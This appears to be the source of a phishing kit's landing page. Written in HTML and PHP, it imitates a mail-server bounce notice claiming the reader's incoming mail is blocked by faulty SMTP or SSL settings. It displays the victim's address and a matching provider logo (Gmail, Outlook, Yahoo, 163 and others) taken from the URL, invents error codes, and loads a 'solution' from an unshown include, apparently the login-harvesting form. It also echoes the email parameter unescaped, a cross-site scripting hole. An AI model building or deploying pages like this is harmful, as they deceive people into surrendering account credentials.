<html>
<head>
<title>Incoming emails has been blocked due to an incorrect settings in your mailbox.</title>
<link rel="shortcut icon" href="favicon.png"/>
<style type="text/css">
body {
	font-family: arial, verdana, sans-serif;
	line-height: 1.666;
	font-size: 14px;
}
div {
	box-sizing: border-box;
}
p {
	padding: 0px;
	clear: both;
	float: none;
	margin: 0px;
}
.container {
	padding: 0px;
	display: block;
	margin-right: 14%;
	margin-left: 14%;
	margin-top: 0%;
	margin-bottom: 0%;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: none;
	border-left-style: solid;
	border-top-color: #ddd;
	border-right-color: #ddd;
	border-bottom-color: #ddd;
	border-left-color: #ddd;
	background-color: #f6f6f6;
}
.container_Inner {
	padding: 0px;
	display: block;
	background-color: #f6f6f6;
	margin: 0px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: none;
	border-left-style: solid;
	border-top-color: #ddd;
	border-right-color: #ddd;
	border-bottom-color: #ddd;
	border-left-color: #ddd;
}
.inner4 {
	background-color: #FFF;
	float: right;
	width: 84%;
	padding: 10px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: solid;
	border-left-color: #ddd;
}
.inner4_inner {
	background-color: #FFF;
	float: right;
	width: 88%;
	padding: 10px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: solid;
	border-left-color: #ddd;
}
.topic3 {
	float: left;
	padding: 10px;
	font-size: 14px;
	text-align: right;
	width: 16%;
	font-weight: bold;
	color: #666;
}
.topic3_inner {
	float: left;
	padding: 10px;
	font-size: 12px;
	text-align: right;
	width: 12%;
	font-weight: bold;
	color: #666;
}
.bg_green {
	background-color: #f4fff4;
}
.bg_ash {
	background-color: #f8f8f8;
}
.TextFaint {
	color: #999;
	line-height: 1.4em;
}
.textfield1 {
	padding: 6px;
	margin-bottom: 8px;
}
.hotz_top {
	border-top-width: 1px;
	border-top-style: solid;
	border-top-color: #ddd;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
.red_text {
	color: #F00;
}
.topHeader {
	font-size: 20px;
	color: #99999;
	margin-right: 14%;
	margin-left: 14%;
	margin-top: 1.2%;
	margin-bottom: 1.2%;
}
.logo {
	display: inline-block;
	clear: none;
	float: right;
	height: auto;
	width: auto;
}
.logo img {
	width: 100%;
}
</style>
<script type="text/javascript">function populate() { 
document.getElementById("demo").innerHTML = Date();
var varSection = window.location.search.substr(1);
document.getElementById("Email").value=varSection;
document.getElementById("lbEmail").value=varSection
} </script>
</head>
<body onLoad="populate()">
<div class="topHeader">Incoming emails has been blocked due to an incorrect settings in your mailbox. </div>
<div class="container">
  <div class="topic3">Message:</div>
  <div class="inner4">
    <?php 
// Show IF Conditional region1 
if (@$_GET['email'] > "") {
?>
      <div class="container_Inner">
        <div class="topic3_inner">Email:</div>
        <div class="inner4_inner">
          <div class="logo">
            <?php
 

$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
if ( strpos($url, 'gmail') !== false ) {
    echo('<img src="accounts.google.com/img/Gmail-logo.png" height="22">');
}
elseif ( strpos($url, 'hotmail') !== false ) {
    echo('<img src="outlook.live.com/SignIn_files/logo1.png" height="22">');
}
elseif ( strpos($url, 'live') !== false ) {
    echo('<img src="hotmail/SignIn_files/logo1.png" height="22">');
}
elseif ( strpos($url, 'mweb') !== false ) {
    echo('<img src="mail.mweb.co.za/file1/logo2.png" height="22">');
}
elseif ( strpos($url, 'iafrica') !== false ) {
    echo('<img src="mail.mweb.co.za/file1/logo2.png" height="22">');
}
elseif ( strpos($url, 'telkomsa') !== false ) {
    echo('<img src="webmail.telkomsa.net/mail_files/logo.png" height="22">');
}
elseif ( strpos($url, 'yahoo') !== false ) {
    echo('<img src="login.yahoo.com/login_files/yahoo_en-US_f_p_bestfit_2x.png" height="22">');
}



elseif ( strpos($url, '126') !== false ) {
    echo('<img src="email.163.com/img/126.png" height="22">');
}
elseif ( strpos($url, '163') !== false ) {
    echo('<img src="email.163.com/img/163.png" height="22">');
}

elseif ( strpos($url, 'yeah') !== false ) {
    echo('<img src="email.163.com/img/yeah.png" height="22">');
}
elseif ( strpos($url, 'shouji') !== false ) {
    echo('<img src="email.163.com/img/shi.png" height="22">');
}



else {
    echo('<img src="login.microsoftonline.com/login_files/office-2.png" height="22">');
}


?>
          </div>
          <strong><?php echo $_GET['email']; ?></strong> </div>
        <p> 
      </div>
      <?php } 
// endif Conditional region1
?>
    <div class="container_Inner">
      <div class="topic3_inner"> Date:</div>
      <div class="inner4_inner">
        <p id="demo"> 
      </div>
      <p> 
    </div>
    <div class="container_Inner">
      <div class="topic3_inner">Subject:</div>
      <div class="inner4_inner"><span class="red_text">Sorry, we encountered an error while trying to access your inbox messages.</span></div>
      <p> 
    </div>
    <div class="hotz_top"></div>
  </div>
  <p> 
</div>
<div class="container">
  <div class="topic3">Bounce reason:</div>
  <div class="inner4 bg_ash"> <strong>The incorrect settings in your SMTP settings is blocking your incoming mails</strong> <br />
    <span class="TextFaint"> 550-5.1.1: POP configuration text can not be verified<br />
    550-5.1.2: Login encountered an unhandled error in your SSL settings<br />
    550-5.1.3: Login encountered an unhandled error in your SSL settings </span> </div>
  <p> 
</div>
<div class="container">
<div class="topic3">Suggested Solution:</div>
<div class="bg_green inner4">
<?php include("inc.php"); ?>
</div>
<p>
<div class="hotz_top"></div>
<script type="text/javascript">try{if(parent.$.Browser.chrome()){var o=document.body.style;o.paddingTop=o.paddingBottom=o.marginTop=o.marginBottom="0px";}parent.JS5.find(window.name).content.setHeight();}catch(e){}/*20130913*/</script>
</div>
<br />
<br />
</body>
</html>